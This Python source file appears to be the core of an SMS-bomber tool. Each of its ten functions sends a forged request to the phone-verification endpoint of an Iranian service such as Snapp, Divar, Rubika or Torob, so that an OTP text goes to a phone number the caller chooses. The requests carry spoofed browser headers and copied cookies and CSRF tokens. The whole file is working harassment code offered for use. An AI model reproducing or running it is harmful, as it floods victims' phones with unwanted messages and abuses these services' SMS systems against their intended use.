import requests
# SMS Here


def snap(phone):
    # snap api
    snapH = {
        'Host': 'app.snapp.taxi',
        'app-version': 'pwa',
        'x-app-version': '5.0.1',
        'x-app-name': 'passenger-pwa',
        'Content-Type': 'application/json',
        'Content-Length': '29'}
    snapD = {"cellphone": phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                              headers=snapH, json=snapD)
        if "OK" in snapR.text:
            print("Snap Send : OK!")
        else:
            print(" Snap:Error!")
    except:
        print("Snap:Error!")


def shad(phone):
    # shad api
    shadH = {"content-length": "203", "Content-Type": "application/json; charset=UTF-8",
             "Host": "shadmessenger1.iranlms.ir", "Accept-Encoding": "gzip, deflate", "User-Agent": "okhttp/3.12.1", "Connection": "close"}
    shadD = {"api_version": "4", "auth": "", "client": {"app_name": "Main", "app_version": "2.4.0", "package": "ir.medu.shad",
                                                        "platform": "Android"}, "data": {"phone_number": phone.split("+")[1], "send_type": "SMS"}, "method": "sendCode"}

    try:
        shadR = requests.post(
            "https://shadmessenger1.iranlms.ir/", headers=shadH, json=shadD)
        if "OK" in shadR.text:
            print("Shad:sended sms:)")
        else:
            print("Shad:Error!")
    except:
        print("Shad:Error!")


def tap30(phone):
    # tap30 api
    tap30H = {"Host": "tap33.me", "Connection": "keep-alive", "Content-Length": "63", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "Accept": "*/*",
              "Origin": "https://app.tapsi.cab", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://app.tapsi.cab/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential": {"phoneNumber": "0" +
                             phone.split("+98")[1], "role": "PASSENGER"}}
    try:
        tap30R = requests.post(
            "https://tap33.me/api/v2/user", headers=tap30H, json=tap30D)
        if "OK" in tap30R.text:
            print("Tap30: sended sms:)")
        else:
            print("Tap30:Error!")
    except:
        print("Tap30:Error!")


def emtiaz(phone):
    # emtiaz api
    emH = {"Host": "web.emtiyaz.app", "Connection": "keep-alive", "Content-Length": "28", "Cache-Control": "max-age\u003d0", "Upgrade-Insecure-Requests": "1", "Origin": "https://web.emtiyaz.app", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
           "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://web.emtiyaz.app/login?offer=299", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "Cookie": "emtiyaz_inapp2=1; show_intro2=1; __cfduid=dc00c8ac38ca32df8774600332ecd85391597624301; emtiyaz_after_login=%2Foffer%2F299; emtiyaz_business_type=0; emtiyaz_cellphone="+phone.split("+98")[1]}
    emD = "send=1&cellphone=0"+phone.split("+98")[1]
    try:
        requests.post("https://web.emtiyaz.app/json/login",
                      headers=emH, data=emD)
        print("Emtiyaz:sended sms:)")
    except:
        print("Emtiyaz:Error!")


def divar(phone):
    # divar api
    divarH = {"Host": "api.divar.ir", "Connection": "keep-alive", "Content-Length": "22", "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded",
              "Origin": "https://divar.ir", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://divar.ir/my-divar/my-posts", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    divarD = {"phone": phone.split("+98")[1]}
    try:
        divarR = requests.post("https://api.divar.ir/v5/auth/authenticate",
                               headers=divarH, json=divarD)
        if "SENT" in divarR.text:
            print("Divar:sended sms:)")
        else:
            print("Divar:Error!")
    except:
        print("Divar:Error!")


def rubika(phone):
    # rubika api
    ruH = {"Host": "messengerg2c4.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "text/plain",
           "origin": "https://web.rubika.ir", "sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.rubika.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    ruD = {"api_version": "3", "method": "sendCode", "data": {
        "phone_number": phone.split("+")[1], "send_type": "SMS"}}
    try:
        ruR = requests.post("https://messengerg2c4.iranlms.ir/",
                            headers=ruH, json=ruD)
        if "OK" in ruR.text:
            print("Rubika:sended sms:)")
        else:
            print("Rubika:Error!")
    except:
        print("Rubika:Error!")


def torob(phone):
    # torob api
    torobH = {"Host": "api.torob.com", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "accept": "*/*", "origin": "https://torob.com", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://torob.com/user/", "accept-encoding": "gzip, deflate, br",
              "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"}
    try:
        torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0" +
                              phone.split("+98")[1], headers=torobH)
        if "sent" in torobR.text:
            print("Torob:sended sms:)")
        else:
            print("Torob:Error!")
    except:
        print("Torob:Error!")


def bama(phone):
    # bama api
    bamaH = {"Host": "bama.ir", "content-length": "22", "accept": "application/json, text/javascript, */*; q\u003d0.01", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE", "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
             "origin": "https://bama.ir", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
    bamaD = "cellNumber=0"+phone.split("+98")[1]
    try:
        bamaR = requests.post("https://bama.ir/signin-checkforcellnumber",
                              headers=bamaH, data=bamaD)
        if "0" in bamaR.text:
            print("Bama:sended sms:)")
        else:
            print("bama:Error!")
    except:
        print("Bama:Error!")


def dr(phone):
    # Pezeshket api
    drh = {"accept": "application/json, text/plain, */*", "accept-language": "fa-IR, en;q=0.8, *;q=0.5",
           "Content-Type": "application/json;charset=utf-8", "Host": "api.pezeshket.com"}
    drj = {"mobileNumber": phone.split("+98")[1]}
    try:
        drR = requests.post(
            "https://api.pezeshket.com/core/v1/auth/requestCode?smsRetriever=true", headers=drh, json=drj)
        if "0" in drR.text:
            print("Pezeshket:sended sms:)")
        else:
            print("pezeshket : Error!")
    except:
        print("pezeshket: Error!")


def gap(phone):
    # gap api
    gapH = {"Host": "core.gap.im", "accept": "application/json, text/plain, */*", "x-version": "4.5.7", "accept-language": "fa",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "appversion": "web", "origin": "https://web.gap.im", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.gap.im/", "accept-encoding": "gzip, deflate, br"}
    try:
        gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(
            phone.split("+")[1]), headers=gapH)
        if "OK" in gapR.text:
            print("Gap:sended sms:)")
        else:
            print("Gap:Error!")
    except:
        print("Gap:Error!")
